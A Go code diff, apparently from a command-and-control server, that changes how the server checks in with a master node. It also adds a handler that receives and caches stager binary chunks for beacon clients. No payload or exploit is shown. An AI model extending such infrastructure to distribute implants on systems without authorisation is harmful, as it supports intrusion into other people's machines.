@@ -579,7 +579,8 @@ func main() {
 		"startup_time": time.Now().Unix(),
 	}
 
-	if err := masterClient.Checkin(stats); err != nil {
+	_, err = masterClient.Checkin(stats)
+	if err != nil {
 		fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
 		fmt.Println("Continuing in resilient mode (will retry in background)")
 	} else {
@@ -594,6 +595,18 @@ func main() {
 			"bind_addr":    cfg.BindAddr,
 			"beacon_count": len(beacons),
 			"uptime":       time.Since(time.Now()).Seconds(),
+		}
+	}, func(cacheTasks []StagerCacheTask) {
+		// Handle stager cache tasks pushed from Master
+		for _, task := range cacheTasks {
+			logf("[Cache] Received stager chunks for %s (%d chunks)", task.ClientBinaryID, task.TotalChunks)
+
+			// Cache all chunks in local database
+			if err := c2Manager.db.CacheStagerChunks(task.ClientBinaryID, task.Chunks); err != nil {
+				logf("[Cache] ⚠️  Failed to cache chunks for %s: %v", task.ClientBinaryID, err)
+			} else {
+				logf("[Cache] ✅ Cached %d chunks for %s", len(task.Chunks), task.ClientBinaryID)
+			}
 		}
 	})
 
